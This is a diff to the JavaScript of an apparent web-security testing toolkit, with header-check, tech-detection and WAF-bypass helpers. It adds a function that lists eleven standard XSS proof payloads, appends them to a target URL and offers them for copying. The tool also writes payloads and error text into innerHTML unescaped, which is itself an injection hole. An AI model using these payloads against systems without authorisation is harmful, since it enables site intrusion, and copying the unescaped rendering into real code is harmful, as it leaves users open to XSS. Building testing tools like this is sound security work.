@@ -40,6 +40,7 @@ window.onclick = function(event) {
     }
 };
 
+
 // Open Edit Modal
 function openEditModal(id, name, url) {
     document.getElementById("editId").value = id;
@@ -86,7 +87,7 @@ function checkHeaders() {
     let url = document.getElementById("url").value;
 
     if (!url) {
-        document.getElementById("result").innerHTML = "❌ Enter URL";
+        document.getElementById("result").innerHTML = " Enter URL";
         return;
     }
 
@@ -103,7 +104,7 @@ function checkHeaders() {
         let output = "";
 
         if (data.error) {
-            output = `<p style="color:red;">❌ ${data.error}</p>`;
+            output = `<p style="color:red;"> ${data.error}</p>`;
         } else {
 
             for (let key in data) {
@@ -111,7 +112,7 @@ function checkHeaders() {
                     output += `
                         <div style="margin-bottom:10px;">
                             <b>${key}</b><br>
-                            <span style="color:#22c55e;">✅ Present</span>
+                            <span style="color:#22c55e;"> Present</span>
                             <br><small>${data[key]}</small>
                         </div>
                     `;
@@ -119,7 +120,7 @@ function checkHeaders() {
                     output += `
                         <div style="margin-bottom:10px;">
                             <b>${key}</b><br>
-                            <span style="color:#ef4444;">❌ Missing</span>
+                            <span style="color:#ef4444;"> Missing</span>
                         </div>
                     `;
                 }
@@ -151,7 +152,7 @@ function detectTech() {
         let output = "";
 
         if (data.error) {
-            output = `<p style="color:red;">❌ ${data.error}</p>`;
+            output = `<p style="color:red;"> ${data.error}</p>`;
         } else {
 
             for (let key in data) {
@@ -378,6 +379,54 @@ function generateWafBypass() {
     document.getElementById("result").innerHTML = output;
 }
 
+function generateXSS() {
+    let url = document.getElementById("url").value.trim();
+
+    let payloads = [
+        `<script>alert(1)</script>`,
+        `"><script>alert(1)</script>`,
+        `'"><script>alert(1)</script>`,
+        `<img src=x onerror=alert(1)>`,
+        `<svg/onload=alert(1)>`,
+        `<body onload=alert(1)>`,
+        `" onmouseover=alert(1) x="`,
+        `' onfocus=alert(1) autofocus '`,
+        `';alert(1)//`,
+        `javascript:alert(1)`,
+        `<iframe src=javascript:alert(1)>`
+    ];
+
+    let output = `<div class="xss-grid">`;
+
+    payloads.forEach(p => {
+        let finalPayload = url ? url + encodeURIComponent(p) : p;
+
+        output += `
+            <div class="xss-card">
+                <code>${finalPayload}</code>
+                <button onclick="copyPayload(this)">Copy</button>
+            </div>
+        `;
+    });
+
+    output += `</div>`;
+
+    document.getElementById("result").innerHTML = output;
+}
+
+function copyPayload(btn) {
+    let text = btn.previousElementSibling.innerText;
+    navigator.clipboard.writeText(text);
+
+    btn.innerText = "Copied!";
+    setTimeout(() => btn.innerText = "Copy", 1000);
+}
+
+function clearXSS() {
+    document.getElementById("url").value = "";
+    document.getElementById("result").innerHTML = "";
+}
+
 function clearInjection() {
     document.getElementById("url").value = "";
     document.getElementById("result").innerHTML = "";
@@ -405,5 +454,10 @@ function clearHeaders() {
 
 function clearFields() {
     document.getElementById("ip").value = "";
+    document.getElementById("result").innerHTML = "";
+}
+
+function clearClickjack() {
+    document.getElementById("url").value = "";
     document.getElementById("result").innerHTML = "";
 }
